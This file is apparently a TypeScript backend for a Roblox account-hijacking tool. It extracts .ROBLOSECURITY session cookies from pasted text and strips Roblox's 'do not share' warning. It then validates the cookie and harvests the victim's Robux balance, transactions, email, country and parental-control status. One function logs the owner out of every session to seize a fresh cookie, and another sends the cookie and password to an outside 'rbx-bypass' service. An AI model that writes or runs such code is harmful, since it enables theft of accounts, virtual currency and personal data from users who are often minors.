import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import { wrapper } from 'axios-cookiejar-support';

export function extractCookie(raw: string): string | null {
  const trimmed = raw.trim();
  // Match the full warning prefix + token, capture token part
  const fullMatch = trimmed.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(CAEQ[A-Za-z0-9._\-+=\/]+)/);
  if (fullMatch) return fullMatch[1]; // return only the token
  const bareMatch = trimmed.match(/^CAEQ[A-Za-z0-9._\-+=\/]+$/);
  if (bareMatch) return bareMatch[0];
  const codeFenceMatch = trimmed.match(/```(?:[a-z]*\n)?([A-Za-z0-9._\-+=\/]+)```/);
  if (codeFenceMatch) return extractCookie(codeFenceMatch[1]);
  // if it looks like a token but without warning, return as is
  if (/^CAEQ[A-Za-z0-9._\-+=\/]{50,}$/.test(trimmed)) return trimmed;
  return null;
}

export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
  valid: boolean;
  userId?: number;
  username?: string;
  displayName?: string;
  debug: string;
  isNetworkError: boolean;
}> {
  const debugLines: string[] = [];
  const log = (msg: string) => debugLines.push(msg);

  const rawCookie = extractCookie(cookie);
  if (!rawCookie) {
    log('No valid cookie token found');
    return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
  }

  const trimmed = rawCookie.trim();

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
      const client = wrapper(axios.create({ jar }));

      const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        validateStatus: () => true,
        timeout: 20000,
      });

      log(`Attempt ${attempt}: status ${resp.status}`);
      if (resp.status === 200) {
        const data = resp.data;
        return {
          valid: true,
          userId: data.id,
          username: data.name,
          displayName: data.displayName,
          debug: debugLines.join('\n'),
          isNetworkError: false,
        };
      }
      if (resp.status === 401) {
        log('Cookie invalid (401)');
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
      }
      if (resp.status === 429 || resp.status === 530) {
        log(`Rate limited or Cloudflare error (${resp.status})`);
        if (attempt < maxAttempts) {
          const delay = Math.min(1000 * Math.pow(2, attempt), 10000) + Math.random() * 1000;
          log(`Waiting ${Math.round(delay)}ms before retry`);
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
      }
    } catch (err: any) {
      log(`Attempt ${attempt} error: ${err.message}`);
      if (attempt === maxAttempts) {
        const isNetwork = err.message.includes('getaddrinfo') || err.message.includes('ENOTFOUND') || err.message.includes('ETIMEDOUT');
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: isNetwork };
      }
      const delay = Math.min(1000 * Math.pow(2, attempt), 8000) + Math.random() * 1000;
      log(`Waiting ${Math.round(delay)}ms before retry`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  return {
    valid: false,
    debug: debugLines.join('\n'),
    isNetworkError: true,
  };
}

export async function getUserAge(userId: number): Promise<number> {
  try {
    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 10000 });
    const created = new Date(resp.data.created);
    const now = new Date();
    const diff = now.getTime() - created.getTime();
    return Math.floor(diff / (1000 * 3600 * 24));
  } catch {
    return -1;
  }
}

export async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
  } catch {}
  return 0;
}

export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
  try {
    const url = `https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`;
    const resp = await fetch(url, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
    }
  } catch {}
  return { incoming: 0, outgoing: 0 };
}

export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
  for (let i = 0; i <= retries; i++) {
    try {
      const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      });
      if (resp.status === 200) {
        const data = (await resp.json()) as { value: { countryName: string } };
        return data.value?.countryName || 'Unknown';
      }
    } catch {}
    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
  }
  return 'Unknown';
}

export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
  for (let i = 0; i <= retries; i++) {
    try {
      const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      });
      if (resp.status === 200) {
        const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
        return { verified: data.verified ? data.emailAddress : null, pending: null };
      }
    } catch {}
    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
  }
  return { verified: null, pending: null };
}

export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
  try {
    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
      return { hasParent: (data.parents && data.parents.length > 0) || false };
    }
  } catch {}
  return { hasParent: false };
}

export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
  try {
    const resp = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
      { headers: { 'User-Agent': 'Mozilla/5.0' } }
    );
    if (resp.status === 200) {
      const data = (await resp.json()) as { data: { imageUrl: string }[] };
      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
        return data.data[0].imageUrl;
      }
    }
  } catch {}
  return null;
}

export async function killAndRefreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
  try {
    const cleanCookie = cookie.trim();
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://roblox.com');
    const client = wrapper(axios.create({ jar }));
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/',
    };

    const url = 'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate';
    let newCookie: string | null = null;
    let authResp;

    for (let attempt = 0; attempt < 3; attempt++) {
      authResp = await client.post(url, {}, { headers, validateStatus: () => true });
      if (authResp.status === 403) {
        const csrf = authResp.headers['x-csrf-token'];
        if (csrf) {
          headers['X-CSRF-TOKEN'] = csrf;
          authResp = await client.post(url, {}, { headers, validateStatus: () => true });
        }
      }
      if (authResp.status === 200) {
        const cookies = jar.getCookiesSync('https://roblox.com');
        const c = cookies.find(c => c.key === '.ROBLOSECURITY');
        if (c) newCookie = decodeURIComponent(c.value);
        if (!newCookie && authResp.headers['set-cookie']) {
          const raw = Array.isArray(authResp.headers['set-cookie'])
            ? authResp.headers['set-cookie'].join(';')
            : authResp.headers['set-cookie'];
          const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) newCookie = match[1];
        }
        if (newCookie) break;
      }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (!newCookie || authResp?.status !== 200) {
      return { success: false, newCookie: null, error: `Reset failed with status ${authResp?.status}` };
    }
    return { success: true, newCookie };
  } catch (err: any) {
    return { success: false, newCookie: null, error: err.message };
  }
}

export async function bypassAgeVerification(cookie: string, password: string): Promise<{ success: boolean; message: string; newCookie?: string }> {
  try {
    const resp = await axios.post(
      'https://rbx-bypass.com/api/public/bypass',
      { cookie, password },
      {
        headers: {
          'authority': 'rbx-bypass.com',
          'accept': '*/*',
          'content-type': 'application/json',
          'origin': 'https://rbx-bypass.com',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        },
        timeout: 20000,
        validateStatus: () => true,
      }
    );
    const data = resp.data;
    if (data.success === true) {
      return { success: true, message: data.message || 'Success', newCookie: data.cookie || undefined };
    }
    if (data.error === 'BYPASS_IN_PROGRESS') {
      return { success: false, message: 'Progressing..' };
    }
    return { success: false, message: data.message || data.error || 'Unknown error' };
  } catch (err: any) {
    if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
      return { success: false, message: 'Progressing..' };
    }
    return { success: false, message: err.message || 'Unknown error' };
  }
}